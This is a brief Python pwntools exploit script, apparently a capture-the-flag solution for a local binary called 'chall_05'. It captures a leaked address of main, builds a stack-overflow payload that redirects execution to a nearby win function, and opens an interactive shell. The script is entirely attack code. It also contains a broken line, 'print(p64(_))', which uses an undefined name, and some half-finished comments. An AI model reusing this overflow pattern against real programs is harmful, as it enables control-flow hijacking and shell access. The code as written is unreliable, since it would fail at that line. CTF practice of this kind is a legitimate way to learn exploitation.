# Main uses puts and we have a vuln function
# Need to leak an Address
# Vuln leaks address of main into rdx


from pwn import *

p = process('./chall_05')
binary = ELF('./chall_05')


#Race, life's greatest
p.recvline()
p.sendline()


p.recvuntil("Yes I'm going to win: ")
address = p.recv()
# 0x40 is the pointer stored at vuln 
# 0x8 is the pointer 

payload = (0x40 - 0x8) * b"A"
# Substract the difference between the win fun
payload += p64(int(address,16)- int(0x13))

print(int(address,16))
leak = int(address,16)
print(p64(_))

print('[*] Launch /bin/sh: ')
p.sendline(payload)
p.interactive()

